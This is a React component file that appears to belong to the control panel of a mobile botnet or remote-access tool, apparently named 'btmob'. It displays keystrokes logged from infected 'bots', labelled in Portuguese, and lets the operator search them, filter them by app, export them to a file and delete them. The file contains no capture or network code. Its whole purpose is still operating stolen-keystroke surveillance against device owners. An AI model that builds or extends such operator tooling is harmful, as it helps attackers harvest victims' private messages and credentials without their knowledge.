import React, { useState } from 'react';
import type { Bot } from '../types';
import { StorageService } from '../services/storage';

interface KeyloggerProps {
  bot: Bot;
}

export const Keylogger: React.FC<KeyloggerProps> = ({ bot }) => {
  const [search, setSearch] = useState('');
  const [appFilter, setAppFilter] = useState('all');

  const keylogs = StorageService.getKeylogs(bot.id);

  // Extract unique applications list for filtering dropdown
  const uniqueApps = Array.from(new Set(keylogs.map(log => log.appName)));

  const filteredLogs = keylogs.filter(log => {
    const matchesSearch = log.text.toLowerCase().includes(search.toLowerCase());
    const matchesApp = appFilter === 'all' || log.appName === appFilter;
    return matchesSearch && matchesApp;
  });

  const handleExport = () => {
    const header = `--- LOGS DE DIGITACAO (KEYLOGGER) - BOT: ${bot.name} --- \n\n`;
    const body = filteredLogs.map(l => `[${l.timestamp}] [${l.appName}] ${l.text}`).join('\n');
    const blob = new Blob([header + body], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `keylogger_${bot.id}.txt`;
    link.click();
    URL.revokeObjectURL(url);
    StorageService.addLog('success', `Exportou logs do keylogger para arquivo local.`, bot.id, bot.name);
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '20px', padding: '16px' }}>
      
      {/* Keylogs filtering and search tools */}
      <div className="glass-panel" style={{ padding: '16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '12px' }}>
        <div style={{ display: 'flex', gap: '8px', flex: 1, minWidth: '250px' }}>
          <input 
            type="text" 
            placeholder="Buscar por texto digitado..." 
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            style={{ flex: 1, fontSize: '14px' }}
          />
          <select 
            value={appFilter} 
            onChange={(e) => setAppFilter(e.target.value)}
            style={{ fontSize: '14px', minWidth: '150px' }}
          >
            <option value="all">Todos os Apps</option>
            {uniqueApps.map(app => (
              <option key={app} value={app}>{app.split('.').pop() || app}</option>
            ))}
          </select>
        </div>
        <div style={{ display: 'flex', gap: '8px' }}>
          <button className="btn btn-secondary" onClick={handleExport} style={{ padding: '8px 16px', fontSize: '13px' }}>
            📥 Exportar TXT
          </button>
          <button 
            className="btn btn-danger" 
            onClick={() => {
              if (confirm("Deseja apagar os logs do keylogger deste bot localmente?")) {
                localStorage.removeItem('btmob_keylogs');
                StorageService.addLog('warning', `Logs do keylogger apagados pelo operador.`, bot.id, bot.name);
                alert("Logs limpos.");
              }
            }} 
            style={{ padding: '8px 16px', fontSize: '13px' }}
          >
            🗑️ Limpar Logs
          </button>
        </div>
      </div>

      {/* Keylogs List display */}
      <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid var(--border-color)', paddingBottom: '8px' }}>
          <h3 style={{ fontSize: '18px', fontWeight: '600' }}>Keystrokes Registrados</h3>
          <span style={{ fontSize: '12px', color: 'var(--text-muted)' }}>Filtrados: {filteredLogs.length} logs</span>
        </div>

        <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', maxHeight: '420px', overflowY: 'auto' }}>
          {filteredLogs.length === 0 ? (
            <p style={{ color: 'var(--text-muted)', textAlign: 'center', padding: '40px' }}>Nenhum log de digitação registrado.</p>
          ) : (
            filteredLogs.map(log => (
              <div 
                key={log.id}
                style={{ 
                  padding: '12px', 
                  borderRadius: '8px', 
                  background: 'var(--bg-secondary)', 
                  border: '1px solid var(--border-color)',
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '6px'
                }}
              >
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '12px' }}>
                  <span style={{ color: 'var(--accent-cyan)', fontWeight: '500', fontFamily: 'var(--font-mono)' }}>
                    📱 {log.appName}
                  </span>
                  <span style={{ color: 'var(--text-muted)' }}>
                    📅 {log.timestamp}
                  </span>
                </div>
                <div style={{ 
                  color: 'var(--text-primary)', 
                  fontSize: '14px', 
                  background: 'var(--bg-primary)', 
                  padding: '8px 12px', 
                  borderRadius: '6px',
                  fontFamily: 'var(--font-mono)',
                  borderLeft: '3px solid var(--accent-purple)'
                }}>
                  {log.text}
                </div>
              </div>
            ))
          )}
        </div>
      </div>

    </div>
  );
};
